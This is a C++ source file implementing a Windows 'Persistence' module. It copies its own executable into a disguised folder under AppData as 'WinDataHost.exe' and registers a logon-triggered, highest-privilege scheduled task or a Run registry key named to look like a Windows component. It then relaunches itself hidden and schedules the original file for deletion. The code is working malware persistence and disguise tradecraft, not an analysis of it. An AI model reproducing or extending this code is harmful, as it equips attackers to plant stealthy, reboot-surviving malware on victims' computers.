#include "Persistence.h"
#include "FileUtils.h"
#include <shellapi.h>
#include "Logger.h"
#include "Config.h"
#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <filesystem>
#include <algorithm>

namespace fs = std::filesystem;

// Smart pointer definitions for Task Scheduler interfaces
_COM_SMARTPTR_TYPEDEF(ITaskService, __uuidof(ITaskService));
_COM_SMARTPTR_TYPEDEF(ITaskDefinition, __uuidof(ITaskDefinition));
_COM_SMARTPTR_TYPEDEF(ITaskFolder, __uuidof(ITaskFolder));
_COM_SMARTPTR_TYPEDEF(IRegisteredTask, __uuidof(IRegisteredTask));
_COM_SMARTPTR_TYPEDEF(IPrincipal, __uuidof(IPrincipal));
_COM_SMARTPTR_TYPEDEF(ITriggerCollection, __uuidof(ITriggerCollection));
_COM_SMARTPTR_TYPEDEF(ITrigger, __uuidof(ITrigger));
_COM_SMARTPTR_TYPEDEF(IActionCollection, __uuidof(IActionCollection));
_COM_SMARTPTR_TYPEDEF(IAction, __uuidof(IAction));
_COM_SMARTPTR_TYPEDEF(IExecAction, __uuidof(IExecAction));

std::wstring Persistence::GetCurrentProcessName() {
    return fs::path(FileUtils::GetExecutablePath()).filename().wstring();
}

bool Persistence::IsInstalled() {
    std::wstring appData = FileUtils::GetAppDataRoamingPath();
    std::wstring currentPath = FileUtils::GetExecutablePath();

    std::wstring currentLower = currentPath;
    std::wstring appDataLower = appData;
    std::transform(currentLower.begin(), currentLower.end(), currentLower.begin(), ::towlower);
    std::transform(appDataLower.begin(), appDataLower.end(), appDataLower.begin(), ::towlower);

    return currentLower.find(appDataLower) != std::wstring::npos;
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

bool CreateRegistryAutostart(const std::wstring& exePath) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring name = L"WindowsDataHost";
        RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), (DWORD)((exePath.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool Persistence::Install() {
    if (IsInstalled()) return true;

    try {
        fs::path appData = FileUtils::GetAppDataRoamingPath();

        // FESTE NAMEN STATT ZUFALL
        std::wstring targetName = L"WinDataHost.exe";
        fs::path targetDir = appData / L"Microsoft" / L"Windows" / L"WinDataHost";

        if (!FileUtils::CreateDirectoryRecursive(targetDir.wstring())) return false;
        // FileUtils::SetFileHidden(targetDir.wstring()); // Optional

        fs::path currentExe = FileUtils::GetExecutablePath();
        fs::path sourceDir = currentExe.parent_path();
        fs::path targetExe = targetDir / targetName;

        if (!CopyFileW(currentExe.wstring().c_str(), targetExe.wstring().c_str(), FALSE)) {
            Logger::Log(L"Failed to copy main executable.");
            return false;
        }

        MoveFileExW(currentExe.wstring().c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

        auto SafeDeploy = [](const fs::path& src, const fs::path& dst) {
            if (fs::exists(src)) {
                return CopyFileW(src.wstring().c_str(), dst.wstring().c_str(), FALSE) != FALSE;
            }
            return true;
            };

        SafeDeploy(sourceDir / L"config322.ini", targetDir / L"config322.ini");

        for (const auto& entry : fs::directory_iterator(sourceDir)) {
            if (entry.is_regular_file() && entry.path().extension() == ".dll") {
                SafeDeploy(entry.path(), targetDir / entry.path().filename());
            }
        }

        bool success = false;
        if (IsAdmin()) {
            // Festen Namen für den Task nutzen
            success = CreateScheduledTask(targetExe.wstring());
        }
        else {
            success = CreateRegistryAutostart(targetExe.wstring());
        }

        if (success) {
            Logger::Log(L"Persistence established at: " + targetExe.wstring());
            std::wstring parameters = L"--cleanup \"" + currentExe.wstring() + L"\"";
            ShellExecuteW(NULL, L"open", targetExe.wstring().c_str(), parameters.c_str(), NULL, SW_HIDE);
            exit(0);
        }
    }
    catch (...) {
        Logger::Log(L"Persistence installation encountered an exception.");
    }

    return false;
}

bool Persistence::CreateScheduledTask(const std::wstring& exePath) {
    try {
        ITaskServicePtr pService;
        if (FAILED(pService.CreateInstance(CLSID_TaskScheduler))) return false;
        if (FAILED(pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()))) return false;

        ITaskDefinitionPtr pTask;
        if (FAILED(pService->NewTask(0, &pTask))) return false;

        IPrincipalPtr pPrincipal;
        if (SUCCEEDED(pTask->get_Principal(&pPrincipal))) {
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        }

        ITriggerCollectionPtr pTriggers;
        if (SUCCEEDED(pTask->get_Triggers(&pTriggers))) {
            ITriggerPtr pTrigger;
            pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);
        }

        IActionCollectionPtr pActions;
        if (SUCCEEDED(pTask->get_Actions(&pActions))) {
            IActionPtr pAction;
            pActions->Create(TASK_ACTION_EXEC, &pAction);
            IExecActionPtr pExec = pAction;
            if (pExec) {
                pExec->put_Path(_bstr_t(exePath.c_str()));
                pExec->put_WorkingDirectory(_bstr_t(fs::path(exePath).parent_path().c_str()));
            }
        }

        ITaskFolderPtr pRoot;
        if (SUCCEEDED(pService->GetFolder(_bstr_t(L"\\"), &pRoot))) {
            // FESTER TASK NAME
            std::wstring name = L"WinDataHost Task";
            IRegisteredTaskPtr pReg;
            HRESULT hr = pRoot->RegisterTaskDefinition(_bstr_t(name.c_str()), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pReg);
            return SUCCEEDED(hr);
        }
    }
    catch (...) {}
    return false;
}
